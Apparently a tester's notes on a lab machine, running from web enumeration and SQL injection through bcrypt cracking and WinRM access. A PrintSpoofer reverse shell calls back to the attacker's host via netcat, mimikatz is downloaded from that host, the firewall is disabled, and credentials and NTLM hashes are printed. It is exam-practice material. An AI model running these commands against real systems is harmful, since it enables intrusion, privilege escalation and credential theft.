# HTTP/80

Boring Website, mybe some usernames

Check URLs:
- `robots.txt` - nope
- `sitemap.xml` - nope

## Nikto

```
nikto --url http://192.168.231.141
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.231.141
+ Target Hostname:    192.168.231.141
+ Target Port:        80
+ Start Time:         2025-10-28 21:02:47 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.51 (Win64) PHP/7.4.26
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /index: Uncommon header 'tcn' found, with contents: list.
+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.html. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
+ Apache/2.4.51 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ PHP/7.4.26 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
+ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE .
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ /icons/: Directory indexing found.
+ /images/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 8908 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2025-10-28 21:07:45 (GMT1) (298 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## Searchsploit Nicepage

```
searchsploit Nicepage 4.8.2                                                      
Exploits: No Results
Shellcodes: No Results

searchsploit Nicepage      
Exploits: No Results
Shellcodes: No Results
```

## gobuster

```bash
gobuster dir -u http://192.168.231.141 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -f 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.231.141
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images/              (Status: 200) [Size: 6651]
/cgi-bin/             (Status: 403) [Size: 290]
/blog/                (Status: 200) [Size: 2237]
/script/              (Status: 200) [Size: 1210]
/phpmyadmin/          (Status: 403) [Size: 290]
/icons/               (Status: 200) [Size: 74798]
/phpsysinfo/          (Status: 403) [Size: 290]
/con/                 (Status: 403) [Size: 290]
/aux/                 (Status: 403) [Size: 290]
/adminer/             (Status: 403) [Size: 290]
/error_log/          (Status: 403) [Size: 290]
/prn/                 (Status: 403) [Size: 290]
```

`/blog/` just some lorem ipsum blog entries.. => mybe local file inclusion? unlikely

---
# HTTP/81

## gobuster

```
gobuster dir -u http://192.168.231.141:81/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -f
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.231.141:81/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/cgi-bin/             (Status: 403) [Size: 290]
/images/              (Status: 200) [Size: 1422]
/admin/               (Status: 200) [Size: 8188]
/scripts/             (Status: 200) [Size: 269]
/plugins/             (Status: 200) [Size: 2478]
/db/                  (Status: 200) [Size: 969]
/index/               (Status: 200) [Size: 4280]
/phpmyadmin/          (Status: 403) [Size: 290]
/icons/               (Status: 200) [Size: 74798]
/header/              (Status: 200) [Size: 1377]
/build/               (Status: 200) [Size: 1600]
/dist/                (Status: 200) [Size: 1377]
/conn/                (Status: 200) [Size: 1655]
/tcpdf/               (Status: 200) [Size: 2716]
/phpsysinfo/          (Status: 403) [Size: 290]
/con/                 (Status: 403) [Size: 290]
/aux/                 (Status: 403) [Size: 290]
/adminer/             (Status: 403) [Size: 290]
/error_log/          (Status: 403) [Size: 290]
/prn/                 (Status: 403) [Size: 290]
Progress: 26583 / 26583 (100.00%)
===============================================================
Finished
===============================================================
```

## SQLi

SQLi in login form:
![[Pasted image 20251028212310.png]]
Local webroot disclosed: `C:\wamp64\attendance\conn.php`

SQLi in `/admin/login.php`
![[Pasted image 20251028213321.png]]

There is a SQL file under /db/:
![[Pasted image 20251028213516.png]]

```bash
cat apsystem.sql

# ...
# INSERT INTO `admin` (`id`, `username`, `password`, `firstname`, `lastname`, `photo`, `created_on`) VALUES
# (1, 'nurhodelta', '$2y$10$fCOiMky4n5hCJx3cpsG20Od4wHtlkCLKmO6VLobJNRIg9ooHTkgjK', 'Neovic', 'Devierte', 'facebook-profile-image.jpeg', '2018-04-30');
# ...
```
=> creds: `nurhodelta:$2y$10$fCOiMky4n5hCJx3cpsG20Od4wHtlkCLKmO6VLobJNRIg9ooHTkgjK`

## Hash cracking

Google: Hash is a bcrypt hash. Manpage for hashcat shows mode 3200
```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt --show
# $2y$10$fCOiMky4n5hCJx3cpsG20Od4wHtlkCLKmO6VLobJNRIg9ooHTkgjK:password
```
=> PW: password

# MySQL

Try creds on mysql:
```bash
mysql -h 192.168.231.141 -P 3306 -u "nurhodelta" -p                          
# Enter password: 
# ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.45.192' is not allowed to connect to this MySQL server

mysql -h 192.168.231.141 -P 3307 -u "nurhodelta" -p                              
# Enter password: 
# ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.45.192' is not allowed to connect to this MariaDB server
```
=> Cant connect from kali. try port forward

# SMB

Shares
```bash
netexec smb 192.168.231.141 -u 'Eric.Wallows' -p 'EricLikesRunning800' --shares                                                                                                                                                   130 ↵
SMB         192.168.231.141 445    MS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS01) (domain:oscp.exam) (signing:False) (SMBv1:False) 
SMB         192.168.231.141 445    MS01             [+] oscp.exam\Eric.Wallows:EricLikesRunning800 
SMB         192.168.231.141 445    MS01             [*] Enumerated shares
SMB         192.168.231.141 445    MS01             Share           Permissions     Remark
SMB         192.168.231.141 445    MS01             -----           -----------     ------
SMB         192.168.231.141 445    MS01             ADMIN$                          Remote Admin
SMB         192.168.231.141 445    MS01             C$                              Default share
SMB         192.168.231.141 445    MS01             IPC$            READ            Remote IPC
SMB         192.168.231.141 445    MS01             setup           READ 
```

Share `setup`:
```bash
smbclient \\\\192.168.231.141\\setup -U 'oscp.exam\Eric.Wallows'%'EricLikesRunning800'
```
=> nothing interesting

# Evil-WinRm

Connect with given creds:
```bash
evil-winrm -i 192.168.231.141 -u 'Eric.Wallows' -p 'EricLikesRunning800'
```


Users:
```powershell
ls

Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/25/2022   1:08 PM                Administrator
d-----        11/10/2022   2:06 AM                Administrator.OSCP
d-----          4/1/2022   9:30 AM                celia.almeda
d-----        10/28/2025   1:52 PM                eric.wallows
d-----          4/1/2022   7:56 AM                Mary.Williams
d-r---        11/18/2020  11:48 PM                Public
d-----         12/5/2022   5:47 AM                support
d-----        11/13/2022  11:23 PM                web_svc


*Evil-WinRM* PS C:\Users> net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
Mary.Williams            support                  WDAGUtilityAccount
The command completed with one or more errors.
```

whoami:
```powershell
C:\Users\eric.wallows\Documents> whoami /all

USER INFORMATION
----------------

User Name         SID
================= ==============================================
oscp\eric.wallows S-1-5-21-2610934713-1581164095-2706428072-7605


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeShutdownPrivilege           Shut down the system                      Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
SeTimeZonePrivilege           Change the time zone                      Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```
=> SeImpersonatePrivilege

Upload PrintSpoofer64 and nc64 for reverse shell:
```powershell
.\PrintSpoofer64.exe -c "nc64.exe 192.168.45.192 4444 -e cmd"
```
BINGO!!!

SYSTEM shell:
```bash
nc -vlnp 4444                
listening on [any] 4444 ...
connect to [192.168.45.192] from (UNKNOWN) [192.168.231.141] 62914
Microsoft Windows [Version 10.0.19044.2251]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Add eric as local admin:
```powershell
net localgroup Administrators oscp\eric.wallows /add
```

Enable RDP:
```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f

# Disable Firewall
netsh advfirewall set allprofiles state off
```

Connect via RDP
```bash
xfreerdp /u:'Eric.Wallows' /p:'EricLikesRunning800' /v:192.168.231.141 /cert:ignore +clipboard /dynamic-resolution
```
=> Message: OSCP\celia.almeda was connected

## Credentials search as administrator

```powershell
Get-ChildItem -Path "C:\Users" -Recurse -File -Force -ErrorAction SilentlyContinue |
Where-Object { $_.Extension -match '\.(xml|json|ini|txt|config|bak)$' } |
Select-String -Pattern 'password', 'pass', 'passwd', 'pwd', 'credentials', 'auth', 'authentication', 'apikey', 'api_key', 'secret', 'token' -CaseSensitive:$false -ErrorAction SilentlyContinue |
Select-Object Path, Line
```
=> didnt find anything interesting

## Mimikatz

Download mimi:
```powershell
iwr -uri http://192.168.45.192/mimikatz.exe -Outfile mimikatz.exe
```

Mimi results:
```
Logoncredentials:
* Username : MS01$
* Domain   : OSCP
* NTLM     : de525fa4f289287e9db5bf70754ecca7

* Username : celia.almeda
* Domain   : OSCP
* NTLM     : e728ecbadfb02f51ce8eed753f3ff3fd
  
* Username : Mary.Williams
* Domain   : MS01
* NTLM     : 9a3121977ee93af56ebd0ef4f527a35e
  
MS01 SAM:

User : Administrator
Hash NTLM: 3c4495bbd678fac8c9d218be4f2bbc7b

User : support
Hash NTLM: d9358122015c5b159574a88b3c0d2071
```


TODO:
- port forward mysql ports 3306,3307 try user "nurhodelta", mybe we find more info in db
- tunneling: AD enum, password spraying